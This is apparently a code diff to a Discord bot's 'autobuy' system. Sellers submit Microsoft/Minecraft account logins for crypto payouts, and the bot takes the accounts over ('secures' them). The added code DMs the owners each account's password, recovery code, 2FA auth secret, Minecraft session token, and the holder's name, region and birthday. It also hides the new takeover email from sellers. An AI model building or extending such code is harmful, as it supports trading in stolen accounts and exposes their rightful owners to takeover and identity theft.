@@ -17,6 +17,327 @@ def _autobuy_cfg() -> dict:
         return json.load(f).get("autobuy") or {}
 
 
+def _owner_ids() -> list[int]:
+    try:
+        with open("config/config.json", "r") as f:
+            raw = json.load(f).get("owners") or []
+        return [int(x) for x in raw]
+    except Exception:
+        logger.exception("Failed to load owner ids")
+        return []
+
+
+def _logs_channel_id() -> int | None:
+    try:
+        with open("config/config.json", "r") as f:
+            ch = (json.load(f).get("discord") or {}).get("logs_channel")
+        return int(ch) if ch else None
+    except Exception:
+        return None
+
+
+async def _dm_owners(
+    client: discord.Client,
+    *,
+    embeds: list[discord.Embed] | None = None,
+    content: str | None = None,
+    guild: discord.Guild | None = None,
+) -> None:
+    owners = _owner_ids()
+    if not owners or (not embeds and not content):
+        return
+
+    payload: dict = {}
+    if content:
+        payload["content"] = content
+    if embeds:
+        # Copy embeds so Discord doesn't choke on reused objects
+        payload["embeds"] = [
+            discord.Embed.from_dict(e.to_dict()) if hasattr(e, "to_dict") else e
+            for e in embeds[:10]
+        ]
+
+    delivered = 0
+    for oid in owners:
+        try:
+            user = client.get_user(oid)
+            if user is None:
+                user = await client.fetch_user(oid)
+
+            # Prefer explicit DM channel creation (more reliable than User.send)
+            try:
+                dm = user.dm_channel or await user.create_dm()
+                await dm.send(**payload)
+                delivered += 1
+                logger.info("autobuy owner DM ok → %s", oid)
+                continue
+            except discord.Forbidden:
+                logger.warning("autobuy owner DM Forbidden for %s — trying guild member", oid)
+            except discord.HTTPException as exc:
+                logger.warning("autobuy owner DM HTTP %s for %s — trying guild member", exc, oid)
+
+            # Fallback: Member.send via a mutual guild
+            member = None
+            if guild is not None:
+                member = guild.get_member(oid)
+                if member is None:
+                    try:
+                        member = await guild.fetch_member(oid)
+                    except discord.HTTPException:
+                        member = None
+            if member is None:
+                for g in getattr(client, "guilds", []) or []:
+                    member = g.get_member(oid)
+                    if member:
+                        break
+            if member is not None:
+                await member.send(**payload)
+                delivered += 1
+                logger.info("autobuy owner DM ok via guild member → %s", oid)
+            else:
+                logger.error("autobuy owner DM failed — no reachable member for %s", oid)
+        except Exception:
+            logger.exception("Failed to DM owner %s autobuy notification", oid)
+
+    # Mirror to logs channel so nothing is silently lost
+    if delivered == 0:
+        logs_id = _logs_channel_id()
+        if logs_id and client:
+            try:
+                channel = client.get_channel(logs_id) or await client.fetch_channel(logs_id)
+                mirror = dict(payload)
+                if mirror.get("content"):
+                    mirror["content"] = f"(owner DM failed) {mirror['content']}"
+                else:
+                    mirror["content"] = "(owner DM failed — mirrored here)"
+                await channel.send(**mirror)
+                logger.info("autobuy owner notify mirrored to logs channel %s", logs_id)
+            except Exception:
+                logger.exception("Failed to mirror autobuy notify to logs channel")
+
+
+async def _notify_owners_submit_started(
+    interaction: discord.Interaction,
+    *,
+    lines: list[str],
+    price: float,
+    ltc: str | None,
+) -> None:
+    """Immediate owner ping when a seller submits — before securing starts."""
+    if not interaction.client:
+        return
+    seller = interaction.user
+    emails = []
+    for line in lines:
+        parts = line.split(":", 1)
+        emails.append(parts[0].strip() if parts else line[:40])
+
+    embed = discord.Embed(
+        title="📥 Autobuy — Sell submitted (processing…)",
+        description=(
+            f"**Seller:** {seller.mention} (`{seller.id}`)\n"
+            f"**Name:** {getattr(seller, 'display_name', seller.name)}\n"
+            f"**Server:** {interaction.guild.name if interaction.guild else 'unknown'}\n"
+            f"**Accounts in batch:** **{len(lines)}** · **${price:.2f}** each"
+        ),
+        color=0x5865F2,
+        timestamp=datetime.now(timezone.utc),
+    )
+    body = "\n".join(f"`{e}`" for e in emails[:15])
+    if len(emails) > 15:
+        body += f"\n… +{len(emails) - 15} more"
+    embed.add_field(name="Emails submitted", value=body or "—", inline=False)
+    if ltc:
+        embed.add_field(name="Seller LTC", value=f"`{ltc}`", inline=False)
+    embed.set_footer(text="You will get another DM per success + a batch summary when done.")
+    await _dm_owners(
+        interaction.client,
+        embeds=[embed],
+        guild=interaction.guild,
+    )
+
+
+def _owner_hit_embed(
+    *,
+    seller: discord.abc.User,
+    submitted_email: str,
+    account: dict,
+    price: float,
+    pending_hours: int,
+    credit_id: int,
+    guild: discord.Guild | None,
+) -> discord.Embed:
+    ms = {}
+    mc = account.get("minecraft") or {}
+    details = account.get("details") or {}
+    # Prefer live fields from stored account payload if present
+    # build_account_embeds returns microsoft under nested details text; hit_embed has creds
+    hit = account.get("hit_embed")
+    account_id = account.get("account_id") or "—"
+
+    # Pull credential fields from the hit embed when possible via details string
+    account_details = details.get("account_details") or ""
+    # Also try reading from secured account structure if ever attached
+    if isinstance(account.get("microsoft"), dict):
+        ms = account["microsoft"]
+
+    embed = discord.Embed(
+        title="🛒 Autobuy — New MFA sold",
+        description=(
+            f"**Seller:** {seller.mention} (`{seller.id}`)\n"
+            f"**Display:** {getattr(seller, 'display_name', seller.name)}\n"
+            f"**Server:** {guild.name if guild else 'DM / unknown'}"
+        ),
+        color=0x57F287,
+        timestamp=datetime.now(timezone.utc),
+    )
+    embed.add_field(name="Submitted email", value=f"```{submitted_email}```", inline=False)
+    embed.add_field(name="Payout", value=f"**${price:.2f}** pending **{pending_hours}h**", inline=True)
+    embed.add_field(name="Credit ID", value=f"`{credit_id}`", inline=True)
+    embed.add_field(name="Account ID", value=f"`{account_id}`", inline=True)
+
+    if ms:
+        embed.add_field(name="Primary email", value=f"```{ms.get('email', '—')}```", inline=False)
+        embed.add_field(name="Security email", value=f"```{ms.get('security_email', '—')}```", inline=True)
+        embed.add_field(name="Password", value=f"```{ms.get('password', '—')}```", inline=True)
+        embed.add_field(name="Recovery code", value=f"```{ms.get('recovery_code', '—')}```", inline=False)
+        if ms.get("auth_secret"):
+            embed.add_field(name="Auth secret", value=f"```{ms.get('auth_secret')}```", inline=False)
+        name_bits = []
+        if ms.get("fullName") and ms.get("fullName") not in ("Failed to Get", "—"):
+            name_bits.append(str(ms["fullName"]))
+        if ms.get("region") and ms.get("region") not in ("Failed to Get", "—"):
+            name_bits.append(str(ms["region"]))
+        if ms.get("birthday") and ms.get("birthday") not in ("Failed to Get", "—"):
+            name_bits.append(f"🎂 {ms['birthday']}")
+        if name_bits:
+            embed.add_field(name="Profile", value=" · ".join(name_bits), inline=False)
+        embed.add_field(
+            name="Minecraft",
+            value=(
+                f"```{mc.get('name') or 'No Minecraft'}```\n"
+                f"Gamertag: `{mc.get('gamertag') or '—'}` · "
+                f"Method: `{mc.get('method') or '—'}` · "
+                f"Capes: `{mc.get('capes') or '—'}`"
+            ),
+            inline=False,
+        )
+    elif account_details:
+        embed.add_field(name="Account details", value=account_details[:1020], inline=False)
+    elif hit is not None:
+        # Fall back: note that full hit embed is attached separately
+        embed.add_field(
+            name="Credentials",
+            value="_Full hit details attached below._",
+            inline=False,
+        )
+
+    embed.set_footer(text=f"Seller @{getattr(seller, 'name', seller.id)}")
+    avatar = getattr(seller, "display_avatar", None)
+    if avatar is not None:
+        embed.set_thumbnail(url=avatar.url)
+    return embed
+
+
+async def _notify_owners_hit(
+    interaction: discord.Interaction,
+    *,
+    submitted_email: str,
+    account: dict,
+    price: float,
+    pending_hours: int,
+    credit_id: int,
+) -> None:
+    if not interaction.client:
+        return
+
+    # Enrich with full secured payload from DB when available
+    account_id = account.get("account_id")
+    if account_id and not isinstance(account.get("microsoft"), dict):
+        try:
+            with DBConnection() as db:
+                row = db.get_secured_account(account_id)
+            if row:
+                account = {
+                    **account,
+                    "microsoft": {
+                        "email": row.get("ms_email"),
+                        "security_email": row.get("ms_security_email"),
+                        "password": row.get("ms_password"),
+                        "recovery_code": row.get("ms_recovery_code"),
+                        "auth_secret": row.get("ms_auth_secret"),
+                        "fullName": row.get("ms_full_name"),
+                        "region": row.get("ms_region"),
+                        "birthday": row.get("ms_birthday"),
+                    },
+                    "minecraft": {
+                        "name": row.get("mc_name"),
+                        "method": row.get("mc_method"),
+                        "gamertag": row.get("mc_gamertag"),
+                        "capes": row.get("mc_capes"),
+                        "SSID": row.get("mc_ssid"),
+                    },
+                }
+        except Exception:
+            logger.exception("Could not load secured account %s for owner DM", account_id)
+
+    notice = _owner_hit_embed(
+        seller=interaction.user,
+        submitted_email=submitted_email,
+        account=account,
+        price=price,
+        pending_hours=pending_hours,
+        credit_id=credit_id,
+        guild=interaction.guild,
+    )
+    embeds = [notice]
+    hit = account.get("hit_embed")
+    if hit is not None:
+        embeds.append(hit)
+    await _dm_owners(interaction.client, embeds=embeds, guild=interaction.guild)
+
+
+async def _notify_owners_batch_summary(
+    interaction: discord.Interaction,
+    *,
+    hits: int,
+    fails: int,
+    earned: float,
+    details: list[str],
+    sold_today: int,
+    max_day: int,
+) -> None:
+    """Always notify owners when a sell submit finishes (even all-fail)."""
+    if not interaction.client:
+        return
+    seller = interaction.user
+    color = 0x57F287 if hits else 0xED4245
+    embed = discord.Embed(
+        title="📋 Autobuy — Sell submit finished",
+        description=(
+            f"**Seller:** {seller.mention} (`{seller.id}`)\n"
+            f"**Name:** {getattr(seller, 'display_name', seller.name)}\n"
+            f"**Server:** {interaction.guild.name if interaction.guild else 'unknown'}"
+        ),
+        color=color,
+        timestamp=datetime.now(timezone.utc),
+    )
+    embed.add_field(name="✅ Success", value=str(hits), inline=True)
+    embed.add_field(name="❌ Failed", value=str(fails), inline=True)
+    embed.add_field(name="💵 Credited", value=f"${earned:.2f}", inline=True)
+    embed.add_field(
+        name="Seller day limit",
+        value=f"**{sold_today}/{max_day}** sold today",
+        inline=False,
+    )
+    if details:
+        body = "\n".join(details)
+        if len(body) > 1000:
+            body = body[:997] + "..."
+        embed.add_field(name="Per-account results", value=body, inline=False)
+    await _dm_owners(interaction.client, embeds=[embed], guild=interaction.guild)
+
+
 async def _grant_seller_role(interaction: discord.Interaction) -> None:
     """Assign the configured seller role after a successful MFA sell."""
     role_raw = _autobuy_cfg().get("seller_role_id")
@@ -410,6 +731,16 @@ class SellMfaModal(ui.Modal):
         )
         msg = await interaction.followup.send(embed=status, ephemeral=True)
 
+        try:
+            await _notify_owners_submit_started(
+                interaction,
+                lines=lines,
+                price=price,
+                ltc=ltc,
+            )
+        except Exception:
+            logger.exception("Failed to DM owners about autobuy submit start")
+
         hits = 0
         fails = 0
         details: list[str] = []
@@ -462,14 +793,24 @@ class SellMfaModal(ui.Modal):
                 # Always DM seller new credentials when recover already changed them
                 fail_embed = None
                 if isinstance(account, dict):
-                    fail_embed = account.get("hit_embed")
+                    # Never show post-secure primary (sunny@) to the seller
+                    fail_embed = account.get("seller_embed") or account.get("hit_embed")
                     if fail_embed is None and account.get("credentials_changed"):
                         from securing.build_embeds import build_failure_embed
 
                         ms = account.get("microsoft") or {}
+                        # Prefer original login email for seller-facing failure DM
+                        seller_email = (
+                            ms.get("original_email")
+                            or email
+                        )
                         fail_embed = build_failure_embed(
-                            email,
-                            ms,
+                            seller_email,
+                            {
+                                **ms,
+                                # Force copy-line to use original, not new primary
+                                "email": seller_email,
+                            },
                             reason,
                             error=account.get("error") or reason,
                             credentials_changed=True,
@@ -535,6 +876,18 @@ class SellMfaModal(ui.Modal):
                 except Exception:
                     logger.exception("Failed to post autobuy hit to accounts channel")
 
+            try:
+                await _notify_owners_hit(
+                    interaction,
+                    submitted_email=email,
+                    account=account,
+                    price=price,
+                    pending_hours=pending_hours,
+                    credit_id=credit_id,
+                )
+            except Exception:
+                logger.exception("Failed to DM owners about autobuy hit")
+
         with DBConnection() as db:
             bals = db.autobuy_balances(interaction.user.id)
             sold_today = db.autobuy_sells_today(interaction.user.id)
@@ -565,6 +918,19 @@ class SellMfaModal(ui.Modal):
             await msg.edit(embed=summary)
         except discord.HTTPException:
             await interaction.followup.send(embed=summary, ephemeral=True)
+
+        try:
+            await _notify_owners_batch_summary(
+                interaction,
+                hits=hits,
+                fails=fails,
+                earned=earned,
+                details=details,
+                sold_today=sold_today,
+                max_day=max_day,
+            )
+        except Exception:
+            logger.exception("Failed to DM owners autobuy batch summary")
 
         if hits > 0:
             await _grant_seller_role(interaction)
